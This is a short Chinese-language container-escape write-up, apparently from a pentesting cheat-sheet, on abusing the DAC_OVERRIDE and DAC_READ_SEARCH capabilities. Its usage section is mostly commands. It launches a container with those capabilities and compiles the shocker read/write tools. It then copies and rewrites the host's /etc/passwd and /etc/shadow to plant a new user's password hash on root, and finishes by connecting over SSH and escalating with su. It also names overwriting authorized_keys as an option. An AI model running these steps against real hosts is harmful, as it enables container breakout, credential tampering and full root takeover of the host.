# DAC override

## Description
DAC_OVERRIDE功能允许绕过读取、写入和执行权限检查。具有DAC_READ_SEARCH和DAC_OVERRIDE功能的容器可以在主机文件系统上读取和写入文件。在此逃逸中，我们将使用这些功能在主机上更新用户的凭据文件，然后使用更新的凭据登录主机。

在这个容器转义技术中，我们将提出2个选项：

通过覆盖主机上的/etc/shadow和/etc/passwd文件来更新用户的登录密码。

通过用我们拥有其私钥的生成的SSH公钥覆盖主机上的~/.ssh/authorized_keys文件来更新用户的SSH授权密钥。

## Usage
创建容器
```bash
docker run -it --cap-drop=ALL --cap-add=DAC_OVERRIDE --cap-add=DAC_READ_SEARCH --cap-add=CHOWN --cap-add=SETGID --cap-add=SETUID --cap-add=FOWNER ubuntu bash
```

覆盖用户密码

```shell
# Copy and paste the shocker.c content
vim shocker.c
gcc -o read shocker.c
# Copy and paste the shocker_write.c content
vim shocker_write.c
gcc -o write shocker_write.c
# Use the ./read to read files from host: ./read /host/path /container/path
./read /etc/shadow shadow
./read /etc/passwd passwd
# Create new user and reset its password
useradd <USER-NAME>
echo '<USER-NAME>:<PASSWORD>' | chpasswd 
# Update the new user details in the copied files from host
tail -1 /etc/passwd >> passwd
tail -1 /etc/shadow >> shadow
# Copy the new user password hash paste it also for the root user in the shadow file. This will allow us to elevate permissions on the host.
vim shadow
# Use the ./write to write files from host: ./write /host/path /container/path
./write /etc/passwd passwd
./write /etc/shadow shadow
# Connect to host over ssh using the new user (unprivileged)
ssh <USER>@<HOST-IP>
# Elevate privileges to root user with the new password
su
```